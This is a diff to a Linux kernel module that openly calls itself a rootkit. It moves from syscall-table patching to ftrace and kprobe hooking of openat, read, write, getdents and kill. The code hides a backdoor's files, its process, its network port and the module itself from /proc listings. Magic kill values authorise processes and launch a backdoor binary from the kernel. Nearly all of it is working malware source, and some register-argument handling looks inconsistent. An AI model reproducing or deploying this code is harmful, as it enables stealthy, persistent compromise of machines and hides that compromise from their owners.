@@ -16,6 +16,9 @@
 #include <linux/syscalls.h>
 #include <linux/utsname.h>
 #include <linux/socket.h>
+#include <linux/ftrace.h>
+#include <linux/kprobes.h>
+
 #include <asm/atomic.h>
 //~ #include <arpa/inet.h>
 #include <asm/current.h>
@@ -39,8 +42,35 @@ MODULE_DESCRIPTION("Basic rootkit");
 static pid_t pid_backdoor = 0;
 static char pid_backdoor_str[12]= {'\0'};
 
-static pid_t authorized_pids[MAX_PIDS] = {0};
-static size_t authorized_pids_cnt = 0;
+typedef struct {
+    pid_t pids[MAX_PIDS];
+    size_t cnt;
+} authorized_pids_t;
+
+static authorized_pids_t authorized_pids = {
+    .pids = {0},
+    .cnt = 0
+};
+
+static int add_authorized_pid(pid_t pid)
+{
+    if(authorized_pids.cnt < MAX_PIDS) {
+        authorized_pids.pids[authorized_pids.cnt++] = pid;
+        return 0;
+    }
+
+    return -1;
+}
+
+static int is_proc_authorized(pid_t pid)
+{
+    int i;
+
+    for(i = 0; i < authorized_pids.cnt; i++)
+        if(pid == authorized_pids.pids[i])
+            return 0;
+    return -1;
+}
 
 atomic_t read_on;
 
@@ -81,6 +111,7 @@ struct linux_dirent
     char            d_name[];   /*!< Filename */
 };
 
+/// @brief  VIP files to process to remove the backdoor traces (ak : needles to hide in the content of the file)
 struct vip_files vip_filenames[] = {
     {.name = "/proc/net/tcp", .fd = -1, .needle_size = 2, .needle = hidden_port},
     {.name = "/proc/modules", .fd = -1, .needle_size = 1, .needle = hidden_module}
@@ -88,165 +119,22 @@ struct vip_files vip_filenames[] = {
 
 const size_t vip_filenames_size = sizeof(vip_filenames) / sizeof(vip_filenames[0]);
 
-//How to find the syscall address and not in hardcoded
-unsigned long * sys_call = NULL;
-unsigned long * do_syscall64 = NULL;
-
-// Original functions
-asmlinkage int (*original_sys_open) (const char *pathname, int flags);
-asmlinkage ssize_t (*original_sys_read) (int fd, void *buf, size_t count);
-asmlinkage ssize_t (*original_sys_write) (int fd, const void *buf, size_t count);
-asmlinkage int (*original_sys_close) (unsigned int fd);
-asmlinkage int (*original_sys_getdents) (unsigned int fd, struct linux_dirent *dip, unsigned int count);
-asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
-asmlinkage int (*original_sys_unlink) (const char *pathname);
-asmlinkage pid_t (*original_sys_getpid) (void);
-asmlinkage pid_t (*original_sys_getppid) (void);
-
-struct file *file_open(const char *path, int flags, int rights);
-int file_close(struct file *file);
-ssize_t file_read(struct file *file, loff_t offset, unsigned char *data, unsigned int size);
-ssize_t file_write(struct file * file, loff_t offset, unsigned char * data, unsigned int size);
-
-/**
- * \fn void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
- * \brief function to search a needle in a haystacks
- *
- * \param haystack : pointer to parsed buffer
- * \param haystack_size : size of the parsed buffer
- * \param needle : pointer to string to search for
- * \param needle_size : size of the needle to search for
- * \return pointer to the matching needle in the haystack, NULL if not found
- */
-void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
-{
-    char *p;
-
-    for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++)
-        if(memcmp(p, needle, needle_size) == 0)
-            return (void *)p;
-    return NULL;
-}
-
-#ifdef __x86_64__
-/**
- * \fn unsigned long *find_sys_call_table(void)
- * \brief function to find the syscall address based on LSTAR register for 64 bits
- *
- * \return Adress of the syscall table, NULL if not found
- */
-unsigned long *find_sys_call_table(void)
-{
-    int i = 0;
-    unsigned long sct_off = 0;
-    unsigned char code[512];
-    char **p;
-
-    rdmsrl(MSR_LSTAR, sct_off);
-    memcpy(code, (void *)sct_off, sizeof(code));
-
-    p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
-
-    printk("Start Hexdump for MSR_LSTAR\n");
-    for(i = 0; i < 512; i++)
-    {
-        printk("%.2x", code[i]);
-    }
-    printk("End Hexdump for MSR_LSTAR\n");
-
-    if(p) {
-        unsigned long *table = *(unsigned long **)((char *)p + 3);
-        table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
-        return table;
-    }
-    return NULL;
-}
-
-void dump_do_syscall(void)
-{
-    int i = 0;
-    unsigned char dump[512];
-
-    if(!do_syscall64)
-        return;
-
-    memcpy(dump, do_syscall64, sizeof(dump));
-    for(i = 0; i < 512; i++)
-    {
-        printk("%.2x", dump[i]);
-    }
-    return;
-}
-
-#else
-/**
- * \struct idtr
- * \brief Don't exactly know what to do here
- *
- */
-struct {
-    unsigned short limit;
-    unsigned long base;
-} __attribute__ ((packed))idtr;
-
-/**
- * \struct idt
- * \brief Don't exactly know what to do here
- *
- */
-struct {
-    unsigned short off1;
-    unsigned short sel;
-    unsigned char none, flags;
-    unsigned short off2;
-} __attribute__ ((packed))idt;
-
-/**
- * \fn unsigned long *find_sys_call_table(void)
- * \brief function to find the syscall address based on LSTAR register for 32 bits
- *
- * \return Adress of the syscall table, NULL if not found
- */
-unsigned long *find_sys_call_table(void) {
-    char **p;
-    unsigned long sct_off = 0;
-    unsigned char code[255];
-
-    asm("sidt %0":"=m" (idtr));
-    memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
-    sct_off = (idt.off2 << 16) | idt.off1;
-    memcpy(code, (void *)sct_off, sizeof(code));
-
-    p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);
-
-    if(p) return *(unsigned long **)((char *)p + 3);
-    else return NULL;
-}
-
-#endif
-
-/**
- * \fn      static int is_proc_authorized(pid_t pid)
- * \brief   Check if a given pid is authorized to read specific file
- * \param   pid : the pid to be checked
- * \return  1 if proc is authorized, 0 otherwise
- * */
-static int is_proc_authorized(pid_t pid)
+/// @brief  Get the index of a vip file based on its file descriptor
+/// @param fd The file descriptor to search for
+/// @return the index of the vip file in the vip_filenames structure, or -1 if not found
+static int get_vip_index_by_fd(int fd)
 {
     int i;
 
-    for(i = 0; i < authorized_pids_cnt; i++)
-        if(pid == authorized_pids[i])
-            return 1;
-    return 0;
+    for(i = 0; i < vip_filenames_size; i++)
+        if(vip_filenames[i].fd == fd)
+            return i;
+    return -1;
 }
 
-/**
- * \fn      static int get_vip_index(const char * filename)
- * \brief   get the table index of a filename
- * \param   filename : filename to be checked
- * \return  index if found, -1 otherwise
- * */
+/// @brief  Get the index of a vip file based on its name(files to be monitored and hidden if needed)
+/// @param filename The name of the file to search for
+/// @return the index of the vip file in the vip_filenames structure, or -1 if not found
 static int get_vip_index(const char * filename)
 {
     size_t i = 0;
@@ -300,104 +188,12 @@ static char * extract_line(const char * buf, char * line, size_t count)
     return (tok + 1);
 }
 
-/**
- * \fn      struct file *file_open(const char *path, int flags, int rights)
- * \brief   Open a file in kernel mode
- * \param   path  : path to the file to open
- * \param   flags : flags used to open the file
- * \param   rights: handle ownership of the created file
- * \return  pointer to struct file, NULL if failure
- * */
-struct file *file_open(const char *path, int flags, int rights)
-{
-    struct file *filp;
-
-    filp = filp_open(path, flags, rights);
-    if (IS_ERR(filp))
-        return NULL;
-
-    return filp;
-}
- 
- /**
- * \fn      int file_close(struct file *file)
- * \brief   close a file in kernel mode
- * \param   file  : pointer to the struct file  to close
- * \return  status of the fiel closure
- * */
-int file_close(struct file *file)
-{
-    return filp_close(file, NULL);
-}
-
-/**
- * \fn int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
- * \brief read a file in kernel mode
- * \param file  : pointer to the struct file  to read
- * \param offset: position of the curser in opened file
- * \param data  : start pointer of the buffer to store data
- * \param size  : size of the storage buffer
- * \return number of bytes read
- * */
-ssize_t file_read(struct file *file, loff_t offset,
-                  unsigned char *data, unsigned int size)
-{
-    return kernel_read(file, data, size, &offset);
-}
-
-/**
- * \fn      int file_sync(struct file * file)
- * \brief   Sync a file
- * \param file : file struct to synched
- * \return 0
- * */
-int file_sync(struct file *file)
-{
-    return vfs_fsync(file, 0);
-}
-
-// Finish editing some files here
- 
-asmlinkage int fake_sys_open(const char *pathname, int flags)
-{
-    int fd = -1;
-    int is_vip = -1;
- 
-    pid_t pid  = original_sys_getpid();
-    pid_t ppid = original_sys_getppid();
-
-    is_vip = get_vip_index(pathname);
-
-    // If authorized, we can open the file
-    if(is_proc_authorized(pid) || is_proc_authorized(ppid))
-    {
-        fd = original_sys_open(pathname, flags);
-        if(is_vip >= 0)
-            vip_filenames[is_vip].fd = fd;
-    }
-    else
-    {
-        if(!strstr(pathname, BACKDOOR_BASENAME))
-        {
-            fd = original_sys_open(pathname, flags);
-            if(is_vip >= 0)
-                vip_filenames[is_vip].fd = fd;
-        }
-    }
-    return fd;
-}
-
-asmlinkage ssize_t fake_sys_write(int fd, const void *buf, size_t count)
-{
-    if(fd == FD_HACK_BACKDOOR)
-    {
-        pid_backdoor = *(pid_t*)buf;
-        snprintf(pid_backdoor_str, 12, "%d", pid_backdoor);
-        return -1;
-    }
-    return original_sys_write(fd, buf, count);
-}
-
+/// @brief Filter the content of a VIP file based on its needles
+/// @param text  : buffer containing the file content
+/// @param count : size of the buffer
+/// @param read  : number of bytes read
+/// @param vip_index : index of the VIP file
+/// @return modified number of bytes read
 static ssize_t filter_vip_file(char * text, size_t count, ssize_t read, int vip_index)
 {
     int j = 0, skip = 0, len = 0;
@@ -409,7 +205,6 @@ static ssize_t filter_vip_file(char * text, size_t count, ssize_t read, int vip_
     if((tmp = (char*)kmalloc(count, GFP_KERNEL)) == NULL)
         return 0;
 
-    //lets just print tmp for now
     do
     {
         memset(line, 0, MAX_LINE_LEN);
@@ -445,23 +240,242 @@ static ssize_t filter_vip_file(char * text, size_t count, ssize_t read, int vip_
     return read;
 }
 
-asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
+/// *** Ftrace hooking code *** ///
+
+//How to find the syscall address and not in hardcoded
+/// @brief Structure for ftrace hooking
+/// This structure is used to define a hook for a function using ftrace. It contains the name of the function to hook,
+/// the pointer to the replacement function, a pointer to store the original function address, and the ftrace operations.
+/// @param name Name of the function to hook (eg: "__x64_sys_open")
+/// @param function Pointer to the replacement function
+/// @param original Pointer to store the original function address
+/// @param address Address of the function to hook (resolved at runtime by kallsyms_lookup_name)
+/// @param ops ftrace operations for the hook
+///
+struct ftrace_hook {
+    const char *name;
+    void *function;
+    void *original;
+
+    unsigned long address;
+    struct ftrace_ops ops;
+};
+
+/// @brief  Resolve the address of the function to hook
+/// This function uses a temporary kprobe to resolve the address of the function specified in the hook structure.
+/// If the function is found, it stores the original function address in the hook structure.
+/// @param hook Pointer to the ftrace_hook structure
+/// @return 0 on success, -ENOENT if the function is not found
+///
+static int resolve_hook_address(struct ftrace_hook *hook)
 {
+    struct kprobe kp = {
+        .symbol_name = hook->name,
+    };
+    int err;
+
+    err = register_kprobe(&kp);
+    if (err)
+        return err;
+
+    hook->address = (unsigned long)kp.addr;
+    unregister_kprobe(&kp);
+
+    if (!hook->address)
+        return -ENOENT;
+
+    *((unsigned long*)hook->original) = hook->address;
+    return 0;
+}
+
+/// @brief  ftrace callback function for the hook
+/// This function is called by ftrace when the hooked function is called.
+/// It retrieves the ftrace_hook structure from the ftrace_ops, and then modifies the instruction pointer (ip) in the pt_regs to point to the replacement function specified in the hook structure.
+/// @param ip Instruction pointer of the hooked function
+/// @param parent_ip Instruction pointer of the caller
+/// @param ops ftrace operations for the hook
+/// @param regs CPU registers
+/// @return void
+///
+static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
+                                    struct ftrace_ops *ops, struct ftrace_regs *fregs)
+{
+    struct ftrace_hook *hook =
+        container_of(ops, struct ftrace_hook, ops);
+
+    struct pt_regs *regs = ftrace_get_regs(fregs);
+
+    (void)ip;
+    (void)parent_ip;
+
+    if (!regs)
+        return;
+
+    if (!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long)hook->function;
+}
+
+/// @brief  Install the ftrace hook
+/// This function resolves the address of the function to hook, sets up the ftrace operations, and registers the hook with ftrace.
+/// It returns 0 on success, or a negative error code
+/// @param hook Pointer to the ftrace_hook structure
+/// @return 0 on success, negative error code on failure
+///
+static int install_hook(struct ftrace_hook *hook)
+{
+    int err;
+
+    err = resolve_hook_address(hook);
+    if (err)
+        return err;
+
+    hook->ops.func = fh_ftrace_thunk;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+#ifdef FTRACE_OPS_FL_RECURSION_SAFE
+                    | FTRACE_OPS_FL_RECURSION_SAFE
+#else
+                    | FTRACE_OPS_FL_RECURSION
+#endif
+                    | FTRACE_OPS_FL_IPMODIFY;
+
+    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
+    if (err)
+        return err;
+
+    err = register_ftrace_function(&hook->ops);
+    return err;
+}
+
+/// @brief  Remove the ftrace hook
+/// This function unregisters the ftrace hook and removes the filter for the hooked function.
+/// @param hook Pointer to the ftrace_hook structure
+/// @return void
+///
+static void remove_hook(struct ftrace_hook *hook)
+{
+    unregister_ftrace_function(&hook->ops);
+    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
+}
+
+// Original functions
+static asmlinkage ssize_t (*original_sys_read) (const struct pt_regs *);
+static asmlinkage ssize_t (*original_sys_write) (const struct pt_regs *);
+static asmlinkage int (*original_sys_getdents) (const struct pt_regs *);
+static asmlinkage int (*original_sys_kill) (const struct pt_regs *);
+static asmlinkage int (*original_sys_unlink) (const struct pt_regs *);
+static asmlinkage pid_t (*original_sys_getpid) (const struct pt_regs *);
+static asmlinkage pid_t (*original_sys_getppid) (const struct pt_regs *);
+static asmlinkage long (*original_sys_openat)(const struct pt_regs *);
+
+static bool enable_log;
+module_param(enable_log, bool, 0644);
+MODULE_PARM_DESC(enable_log, "Enable hook logging");
+
+/* Registering a hook with ftrace is a bit more complex than just replacing a function pointer in the syscall table.
+arg0	rdi	regs->di
+arg1	rsi	regs->si
+arg2	rdx	regs->dx
+arg3	r10	regs->r10
+arg4	r8	regs->r8
+arg5	r9	regs->r9
+*/
+
+// int openat(int dirfd, const char *pathname, int flags);
+// int openat(int dirfd, const char *pathname, int flags, mode_t mode);
+static asmlinkage long fake_sys_openat(const struct pt_regs *regs)
+{
+    if (enable_log)
+        pr_info_ratelimited("openat() called\n");
+
+    int dfd = regs->di;                  // arg0
+    const char __user *filename = (const char __user *)regs->si; // arg1
+    int flags = regs->dx;                // arg2
+    umode_t mode = regs->r10;            // arg3
+
+    char filename_buf[256];
+    if (strncpy_from_user(filename_buf, filename, sizeof(filename_buf)) > 0) {
+        if (enable_log)
+            pr_info_ratelimited("openat() called with dirfd=%d, filename=%s, flags=%d, mode=%d\n", dfd, filename_buf, flags, mode);
+    }
+
+    int fd = -1;
+ 
+    pid_t pid  = original_sys_getpid(regs);
+    pid_t ppid = original_sys_getppid(regs);
+
+    int is_vip = get_vip_index(filename_buf);
+
+    // If authorized, we can open the file
+    if(is_proc_authorized(pid) == 0 || is_proc_authorized(ppid) == 0 )
+    {
+        fd = original_sys_openat(regs);
+        if(is_vip >= 0)
+        {
+            // We store the file descriptor of the VIP file in the vip_filenames structure to be able to filter it later in read
+            vip_filenames[is_vip].fd = fd;
+        }
+            
+    }
+    else
+    {
+        // Do not open a file handled by the rootkit, but only if it is not an authorized process, otherwise we would not be able to hide the backdoor traces in the VIP files
+        if(!strstr(filename_buf, BACKDOOR_BASENAME))
+        {
+            fd = original_sys_openat(regs);
+            if(is_vip >= 0) {
+                vip_filenames[is_vip].fd = fd;
+            }
+                
+        }
+    }
+
+    return fd;
+}
+
+
+// ssize_t write(int fd, const void *buf, size_t count);  
+static asmlinkage ssize_t fake_sys_write(const struct pt_regs *regs)
+{
+    //int dfd = regs->di;                                             // arg0
+    int fd = regs->si;                                              // arg1
+    const void __user *buf = (const void __user *)regs->dx;         // arg2
+    size_t count = regs->r10;                                       // arg3
+
+    if (enable_log)
+        pr_info_ratelimited("write() called with fd=%d, buf=%p, count=%zu\n", fd, buf, count);
+
+    if(fd == FD_HACK_BACKDOOR)
+    {
+        // We get the pid of the backdoor process, store it in a global variable and convert it to string for later use in getdents
+        pid_backdoor = *(pid_t*)buf;
+        snprintf(pid_backdoor_str, 12, "%d", pid_backdoor);
+        return -1;
+    }
+
+    return original_sys_write(regs);
+}
+
+// ssize_t read(int fd, void *buf, size_t count);
+static asmlinkage ssize_t fake_sys_read(const struct pt_regs *regs)
+{
+    //int dfd = regs->di;                         // arg0
+    int fd = regs->si;                          // arg1
+    void __user *buf = (void __user *)regs->dx; // arg2
+    size_t count = regs->r10;                   // arg3
+
     int     index = 0;
     ssize_t read     = 0;
-    pid_t   pid     = original_sys_getpid();
-    pid_t   ppid    = original_sys_getppid();
+    pid_t   pid     = original_sys_getpid(regs);
+    pid_t   ppid    = original_sys_getppid(regs);
 
-    for(index = 0; index < vip_filenames_size; index++)
-        if(vip_filenames[index].fd == fd)
-            break;
-
-    read = original_sys_read(fd, buf, count);
+    index = get_vip_index_by_fd(fd);
+    read = original_sys_read(regs);
 
     // Not a vip file, read in normally
-    if(index == vip_filenames_size || is_proc_authorized(pid) || is_proc_authorized(ppid))
+    if(index == -1 || is_proc_authorized(pid) == 0 || is_proc_authorized(ppid) == 0)
         return read;
 
+    // If it is a vip file, we check if the content contains the needle, if it does, we hide it by returning only the content before the needle and removing the content after the needle
     atomic_set(&read_on, 1);
     read = filter_vip_file((char*) buf, count, read, index);
     atomic_set(&read_on, 0);
@@ -471,8 +485,13 @@ asmlinkage ssize_t fake_sys_read(int fd, void *buf, size_t count)
     return read;
 }
 
-asmlinkage int fake_sys_kill(pid_t pid, int sig)
+// int kill(pid_t pid, int sig);
+static asmlinkage int fake_sys_kill(const struct pt_regs *regs)
 {
+    //int dfd = regs->di;   // arg0
+    pid_t pid = regs->si; // arg1
+    //int sig = regs->dx;   // arg2
+
     int    ret    = 0;
     char * argv[] = {BACKDOOR_PATH, NULL};
     char * envp[] = { NULL };
@@ -480,24 +499,44 @@ asmlinkage int fake_sys_kill(pid_t pid, int sig)
     switch(pid)
     {
         case MAGIC_AUTH_PID:
-            printk("[%s] Received auth key...\n", __this_module.name);
-            if(authorized_pids_cnt < MAX_PIDS)
-                authorized_pids[authorized_pids_cnt++] = current->pid;
+            if (enable_log)
+                pr_info("[%s] Received auth key...\n", __this_module.name);
+
+            if (add_authorized_pid(current->pid) == 0)
+                pr_info("[%s] Process %d added to authorized list\n", __this_module.name, current->pid);
+            else
+                pr_info("[%s] Failed to add process %d to authorized list\n", __this_module.name, current->pid);
+
             break;
         case MAGIC_BACKDOOR:
-            printk("[%s] Start process %s\n", __this_module.name, BACKDOOR_PATH);
+            if (enable_log)                
+                pr_info("[%s] Received backdoor key...\n", __this_module.name);
+
+            // prepare and start 
             ret = call_usermodehelper(BACKDOOR_PATH, argv, envp, UMH_WAIT_EXEC);
             //~ ret = original_sys_execve(filename, argv, envp);
-            printk("[%s] Finish process %s %d\n", __this_module.name, BACKDOOR_PATH, ret);
+            if (enable_log)
+                pr_info("[%s] Finish process %s %d\n", __this_module.name, BACKDOOR_PATH, ret);
             break;
         default:
-            ret = original_sys_kill(pid, sig);
+            ret = original_sys_kill(regs);
     }
     return ret;
 }
 
-asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
+// int getdents(unsigned int fd, struct dirent *dirp, unsigned int count);
+static asmlinkage int fake_sys_getdents(const struct pt_regs *regs)
 {
+
+    //arg0	rdi	regs->di
+    //arg1	rsi	regs->si
+    //arg2	rdx	regs->dx
+    //arg3	r10	regs->r10
+
+    //unsigned int fd = regs->si;                                     // arg1
+    struct linux_dirent *dirp = (struct linux_dirent *)regs->dx;    // arg2
+    //unsigned int count = regs->r10;                                 // arg3
+
 // Get the relevant informations
 #define LOGS_SIZE   512
     unsigned long           bpos        = 0;
@@ -508,13 +547,13 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     struct linux_dirent *   dir         = NULL;
     struct linux_dirent *   prev        = NULL;
     int                     nread       = 0;
-    pid_t                   pid         = original_sys_getpid();
-    pid_t                   ppid        = original_sys_getppid();
+    pid_t                   pid         = original_sys_getpid(regs);
+    pid_t                   ppid        = original_sys_getppid(regs);
 
-    if(is_proc_authorized(pid) || is_proc_authorized(ppid))
-        return original_sys_getdents(fd, dirp, count);
+    if(is_proc_authorized(pid) == 0 || is_proc_authorized(ppid) == 0)
+        return original_sys_getdents(regs);
 
-    nread = original_sys_getdents(fd, dirp, count);
+    nread = original_sys_getdents(regs);
 
     buf = (char*)dirp;
 
@@ -597,78 +636,151 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     return (nread - lost_data);
 }
 
+static struct ftrace_hook hooks[] = {
+    {
+        .name = "__x64_sys_openat",
+        .function = fake_sys_openat,
+        .original = &original_sys_openat,
+    },
+    {
+        .name = "__x64_sys_read",
+        .function = fake_sys_read,
+        .original = &original_sys_read,
+    },
+    {
+        .name = "__x64_sys_write",
+        .function = fake_sys_write,
+        .original = &original_sys_write,
+    },
+    {
+        .name = "__x64_sys_getdents",
+        .function = fake_sys_getdents,
+        .original = &original_sys_getdents,
+    },
+    {
+        .name = "__x64_sys_kill",
+        .function = fake_sys_kill,
+        .original = &original_sys_kill,
+    },
+    {
+        .name = "__x64_sys_getpid",
+        .function = NULL,
+        .original = &original_sys_getpid,
+    },
+    {
+        .name = "__x64_sys_getppid",
+        .function = NULL,
+        .original = &original_sys_getppid,
+    },
+};
+
+
+struct file *file_open(const char *path, int flags, int rights);
+int file_close(struct file *file);
+ssize_t file_read(struct file *file, loff_t offset, unsigned char *data, unsigned int size);
+ssize_t file_write(struct file * file, loff_t offset, unsigned char * data, unsigned int size);
+
+/**
+ * \fn      struct file *file_open(const char *path, int flags, int rights)
+ * \brief   Open a file in kernel mode
+ * \param   path  : path to the file to open
+ * \param   flags : flags used to open the file
+ * \param   rights: handle ownership of the created file
+ * \return  pointer to struct file, NULL if failure
+ * */
+struct file *file_open(const char *path, int flags, int rights)
+{
+    struct file *filp;
+
+    filp = filp_open(path, flags, rights);
+    if (IS_ERR(filp))
+        return NULL;
+
+    return filp;
+}
+ 
+ /**
+ * \fn      int file_close(struct file *file)
+ * \brief   close a file in kernel mode
+ * \param   file  : pointer to the struct file  to close
+ * \return  status of the fiel closure
+ * */
+int file_close(struct file *file)
+{
+    return filp_close(file, NULL);
+}
+
+/**
+ * \fn int file_read(struct file * file, unsigned long long offset, unsigned char * data, unsigned int size)
+ * \brief read a file in kernel mode
+ * \param file  : pointer to the struct file  to read
+ * \param offset: position of the curser in opened file
+ * \param data  : start pointer of the buffer to store data
+ * \param size  : size of the storage buffer
+ * \return number of bytes read
+ * */
+ssize_t file_read(struct file *file, loff_t offset,
+                  unsigned char *data, unsigned int size)
+{
+    return kernel_read(file, data, size, &offset);
+}
+
+
 static int __init lkm_init(void)
 {
     atomic_set(&read_on, 0);
 
-    sys_call = (unsigned long *)find_sys_call_table();
+    int err;
 
-    if(!sys_call)
+    for (int i = 0; i < sizeof(hooks) / sizeof(hooks[0]); i++)
     {
-        sys_call = (unsigned long *)kallsyms_lookup_name("sys_call_table");
-        if(!sys_call)
-        {
-            printk("[%s] module not loaded, could not find syscall table\n", __this_module.name);
-        }
-        else
-        {
-            printk("[%s] 2.sys_call_table : 0x%p.\n", __this_module.name, sys_call);
+        err = install_hook(&hooks[i]);
+        if (err) {
+            printk(KERN_ERR "hook failed\n");
+            return err;
         }
     }
-    else
-        printk("[%s] 1.sys_call_table found : 0x%p.\n", __this_module.name, sys_call);
+    
+    if (enable_log)
+        printk(KERN_INFO "hooks installed\n");
 
-    do_syscall64 =(unsigned long *)kallsyms_lookup_name("do_syscall_64");
-    dump_do_syscall();
-
-    original_sys_open       = (void*)sys_call[__NR_open];
-    original_sys_read       = (void*)sys_call[__NR_read];
-    original_sys_write      = (void*)sys_call[__NR_write];
-    original_sys_close      = (void*)sys_call[__NR_close];
-    original_sys_getdents   = (void*)sys_call[__NR_getdents];
-    original_sys_kill       = (void*)sys_call[__NR_kill];
-    original_sys_getpid     = (void*)sys_call[__NR_getpid];
-    original_sys_getppid    = (void*)sys_call[__NR_getppid];
-    original_sys_unlink     = (void*)sys_call[__NR_unlink];
-    write_cr0(read_cr0() & (~0x10000));
-    sys_call[__NR_open]     = (unsigned long)fake_sys_open;
-    sys_call[__NR_write]    = (unsigned long)fake_sys_write;
-    sys_call[__NR_read]     = (unsigned long)fake_sys_read;
-    sys_call[__NR_getdents] = (unsigned long)fake_sys_getdents;
-    sys_call[__NR_kill]     = (unsigned long)fake_sys_kill;
-    write_cr0(read_cr0() | (0x10000));
-    printk(KERN_INFO "[%s] module loaded.\n", __this_module.name);
     return 0;
 }
 
 static void __exit lkm_exit(void)
 {
+    struct pt_regs kill_regs = {0};
+
+    kill_regs.di = pid_backdoor;
+    kill_regs.si = SIGKILL;
+
     //Do not forget to kill backdoor
     if(pid_backdoor != 0)
-        if(original_sys_kill(pid_backdoor, SIGKILL) == 0)
+        if(original_sys_kill(&kill_regs) == 0)
             printk("[%s] Successful send SIGKILL to backdoor[%d]", __this_module.name, pid_backdoor);
 
-    if(!original_sys_unlink(BACKDOOR_PATH))
-        printk("[%s] Successful remove %s", __this_module.name, BACKDOOR_PATH);
+    struct pt_regs unlink_regs = {0};
+    unlink_regs.si = (unsigned long) BACKDOOR_PATH;
 
-    write_cr0(read_cr0() & (~0x10000));
-    sys_call[__NR_getdents] = (unsigned long)original_sys_getdents;
-    sys_call[__NR_kill]     = (unsigned long)original_sys_kill;
-    write_cr0(read_cr0() | (0x10000));
+    if(!original_sys_unlink(&unlink_regs))
+        printk("[%s] Successful remove %s", __this_module.name, BACKDOOR_PATH);
 
     // Wait until all read are done
     while(atomic_read(&read_on) != 0) schedule();
 
-    write_cr0(read_cr0() & (~0x10000));
-    sys_call[__NR_open]     = (unsigned long)original_sys_open;
-    sys_call[__NR_write]     = (unsigned long)original_sys_write;
-    sys_call[__NR_read]     = (unsigned long)original_sys_read;
-    write_cr0(read_cr0() | (0x10000));
+    for (int i = 0; i < sizeof(hooks) / sizeof(hooks[0]); i++) {
+        remove_hook(&hooks[i]);
+    }
 
-    printk(KERN_INFO "[%s] module unloaded.\n", __this_module.name);
+    if (enable_log)
+        printk(KERN_INFO "hook removed\n");
 }
 
 // how to find the syscall table in this case
 
 module_init(lkm_init);
 module_exit(lkm_exit);
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Antoine Rouquette");
+MODULE_DESCRIPTION("A simple rootkit example with ftrace hooking");
